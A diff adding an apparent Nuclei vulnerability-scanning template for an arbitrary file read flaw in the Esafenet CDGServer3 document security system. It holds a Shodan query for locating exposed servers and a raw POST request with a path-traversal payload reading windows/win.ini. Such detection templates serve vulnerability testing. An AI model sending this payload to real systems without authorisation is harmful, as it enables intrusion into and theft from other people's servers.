@@ -1,0 +1,31 @@
+id: esafenet_downloadfromfile_FileRead
+
+info:
+  name: esafenet_downloadfromfile_FileRead
+  author: HK
+  severity: high
+  description: 亿赛通电子文档安全管理系统/CDGServer3/downloadfromfile接口存在任意文件读取漏洞
+  metadata:
+    max-request: 1
+    shodan-query: body="/CDGServer3/index.jsp"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /CDGServer3/downloadfromfile HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 57
+
+    fileName=../../../../../../../../../../../windows/win.ini
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - '[extensions]'
